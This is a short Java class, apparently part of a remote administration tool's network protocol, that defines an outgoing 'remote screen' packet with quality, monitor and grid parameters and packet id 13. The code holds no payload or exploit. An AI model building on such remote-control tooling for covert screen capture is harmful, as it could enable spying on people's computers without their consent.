package com.redpois0n.packets.outgoing;


public class Packet13OneRemoteScreen extends Packet12RemoteScreen {

	public Packet13OneRemoteScreen(int quality, int monitor, int rows, int cols) {
		super(quality, monitor, rows, cols);
	}

	@Override
	public byte getPacketId() {
		return 13;
	}

}
